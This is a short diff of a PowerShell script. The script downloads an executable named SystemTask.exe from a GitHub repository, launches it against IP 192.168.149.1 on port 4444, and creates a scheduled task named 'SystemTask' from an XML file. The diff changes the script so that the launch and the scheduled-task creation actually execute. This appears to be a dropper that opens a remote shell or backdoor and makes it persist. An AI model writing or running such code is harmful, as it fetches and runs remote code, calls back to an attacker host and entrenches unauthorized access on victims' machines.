@@ -5,5 +5,6 @@ $client.DownloadFile($url,$file)
 $url = 'https://raw.githubusercontent.com/Gh0st1nTh3Sh3ll1/SystemTask/master/SystemTask.exe' 
 $file = 'SystemTask.exe'
 $client.DownloadFile($url,$file)
-iex 'SystemTask.exe "192.168.149.1" "4444"'
-'schtasks.exe /create /tn "SystemTask" /xml "SystemTask.xml"'
+SystemTask.exe "192.168.149.1" "4444"
+$command = 'schtasks.exe /create /tn "SystemTask" /xml SystemTask.xml'
+iex $command
